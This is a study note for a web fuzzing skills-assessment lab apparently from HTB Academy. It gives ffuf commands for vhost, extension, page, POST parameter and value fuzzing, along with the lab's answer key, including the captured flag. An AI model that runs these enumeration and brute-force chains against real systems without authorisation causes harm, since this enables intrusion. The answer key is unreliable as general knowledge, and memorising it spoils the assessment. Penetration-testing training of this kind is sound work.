# LAB — Skills Assessment

## ID
13

## Module
Ffuf

## Kind
lab

## Title
Section 13 — Skills Assessment — Web Fuzzing

## Description
End-to-end chain: vhost discovery → extension fuzz → recursive page fuzz → POST parameter discovery → value fuzz → flag extraction.

## Tags
ffuf, skills-assessment, lab, end-to-end, vhost, recursion, parameters

## Commands
- `ffuf -w /opt/useful/seclists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://STMIP:STMPO -H 'Host: FUZZ.academy.htb' -fs 985`
- `ffuf -w /opt/useful/seclists/Discovery/Web-Content/web-extensions.txt:FUZZ -u http://faculty.academy.htb:STMPO/indexFUZZ`
- `ffuf -w /opt/useful/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://faculty.academy.htb:STMPO/courses/FUZZ -e .php,.phps,.php7 -fs 287 -mr "You don't have access!" -t 100`
- `ffuf -w /opt/useful/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u http://faculty.academy.htb:STMPO/courses/linux-security.php7 -X POST -d 'FUZZ=key' -H 'Content-Type: application/x-www-form-urlencoded' -fs 774 -t 100`
- `ffuf -w /opt/useful/seclists/Usernames/Names/names.txt:FUZZ -u http://faculty.academy.htb:STMPO/courses/linux-security.php7 -X POST -d 'username=FUZZ' -H 'Content-Type: application/x-www-form-urlencoded' -fs 781 -t 100`
- `curl -s http://faculty.academy.htb:STMPO/courses/linux-security.php7 -X POST -d 'username=harry' | grep "HTB{.*}"`

## Methodology — Full Chain
1. **Vhost fuzz on the IP** — calibrate baseline (`-fs 985` or `-ac`) to surface non-default vhosts.
2. **Add discovered vhosts to `/etc/hosts`** in a single line:
   `sudo bash -c 'echo "STMIP test.academy.htb archive.academy.htb faculty.academy.htb" >> /etc/hosts'`
3. **Extension fuzz `indexFUZZ` on each vhost** to see what file types are parsed (`.php`, `.phps`, `.php7`).
4. **Recursive page fuzz** with discovered extensions, using `-mr` regex matcher to find the "You don't have access!" page directly.
5. **POST parameter fuzz** on the protected page → discover `user` / `username`.
6. **Value fuzz `username` with names list** → find `harry`.
7. **curl + grep** the flag.

## Lab — Questions & Answers
| Q | Answer | Found In / Method |
|---|--------|-------------------|
| Q1 — All sub-domains/vhosts on `*.academy.htb` | **test, archive, faculty** | `ffuf -w subdomains-top1million-5000.txt:FUZZ -u http://STMIP:STMPO -H 'Host: FUZZ.academy.htb' -fs 985` (or `-ac`) |
| Q2 — Extensions accepted across the vhosts | **.php, .phps, .php7** | `ffuf -w web-extensions.txt:FUZZ -u http://<vhost>.academy.htb:STMPO/indexFUZZ` on each vhost — `test`/`archive` show `.php`+`.phps`; `faculty` adds `.php7` |
| Q3 — Page returning "You don't have access!" | **http://faculty.academy.htb:PORT/courses/linux-security.php7** | Recursive fuzz with regex matcher: `ffuf -w directory-list-2.3-small.txt:FUZZ -u http://faculty.academy.htb:STMPO/FUZZ -recursion -recursion-depth 1 -e .php,.phps,.php7 -fs 287 -mr "You don't have access!" -t 100` |
| Q4 — Accepted POST parameters on that page | **user, username** | `ffuf -w burp-parameter-names.txt:FUZZ -u http://faculty.academy.htb:STMPO/courses/linux-security.php7 -X POST -d 'FUZZ=key' -H 'Content-Type: application/x-www-form-urlencoded' -fs 774 -t 100` |
| Q5 — Flag from value-fuzzing the `username` parameter | **HTB{w3b_fuzz1n6_m4573r}** | Value fuzz with names list, filter baseline 781 → hit `harry`. Confirm with `curl -s http://faculty.academy.htb:STMPO/courses/linux-security.php7 -X POST -d 'username=harry' \| grep "HTB{.*}"` |

## Key Takeaways
- Combine **`-mr <regex>`** with **`-e <ext-list>`** + **recursion** to skip the "find dir, then fuzz inside it" two-step on assessments.
- `-t 100` is acceptable on isolated lab targets to speed through long chains. Don't try this on production.
- Speeding up Q3: as soon as ffuf queues a new recursion job (`Adding a new job to the queue: .../courses/FUZZ`), you can **kill it and restart targeting that path directly** — saves minutes.
- The full chain mirrors a real engagement: enumerate vhosts → enumerate content → enumerate inputs → enumerate values. Each step constrains the next.

## Gotchas
- The same baseline trick (`-fs`) needs to be re-calibrated at each stage — vhost baseline ≠ extension baseline ≠ parameter baseline ≠ value baseline.
- The `-ac` auto-calibration is fastest, but on dynamic pages it may pick up an inconsistent baseline. Compare results with manual `-fs` if `-ac` looks off.
- Watch for **trailing slashes** in URLs when chaining recursion — `/courses` vs `/courses/` can change the parser path on some configs.

<!-- AUTO-LINKS-START -->
---
**Module:** [[00-overview|ffuf]]
← [[12-value-fuzzing]]
<!-- AUTO-LINKS-END -->
